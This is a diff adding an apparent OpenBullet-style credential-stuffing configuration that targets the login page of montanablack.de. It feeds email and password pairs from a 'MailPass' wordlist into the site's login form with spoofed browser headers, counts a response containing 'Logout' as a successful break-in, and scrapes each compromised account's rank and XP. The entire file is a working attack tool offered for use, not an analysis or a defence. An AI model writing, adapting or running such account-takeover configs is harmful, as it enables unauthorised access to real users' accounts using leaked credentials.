@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "Montanablack.de",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-16T16:15:02.0247105+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Acemy#7578",
+  "Version": "1.2.1.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://montanablack.de/mein-konto/" 
+  CONTENT "woo_slg_social_gp_redirect_url=https%3A%2F%2Faccounts.google.com%2Fo%2Foauth2%2Fauth%3Fclient_id%3D150417487864-3p03qsigmipujhclsb1d6ooh03ll9a0q.apps.googleusercontent.com%26redirect_uri%3Dhttps%253A%252F%252Fmontanablack.de%253Fwooslg%253Dgoogle%26response_type%3Dcode%26scope%3Dhttps%253A%252F%252Fwww.googleapis.com%252Fauth%252Fuserinfo.profile%2Bhttps%253A%252F%252Fwww.googleapis.com%252Fauth%252Fuserinfo.email&woo_slg_social_inst_redirect_url=https%3A%2F%2Fapi.instagram.com%2Foauth%2Fauthorize%3Fclient_id%3De447e9e6e6324d9d813967366a3ddfbb%26redirect_uri%3Dhttps%253A%252F%252Fmontanablack.de%253Fwooslg%253Dinstagram%26scope%3Dbasic%26response_type%3Dcode&username=<USER>&password=<PASS>&_wpnonce=545f215251&_wp_http_referer=%2Fmein-konto%2F&login=LOGIN" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authority: montanablack.de" 
+  HEADER "method: POST" 
+  HEADER "path: /mein-konto/" 
+  HEADER "scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "origin: https://montanablack.de" 
+  HEADER "referer: https://montanablack.de/mein-konto/" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+  KEYCHAIN Failure OR 
+    KEY "Kein Benutzer mit dieser E-Mail-Adresse gefunden" 
+
+PARSE "<SOURCE>" LR "Dein Rank: <em>" "</em></p>" -> CAP "Rank" 
+
+PARSE "<SOURCE>" LR "Deine XP: <em>" "</em></p>" -> CAP "XP" 
+
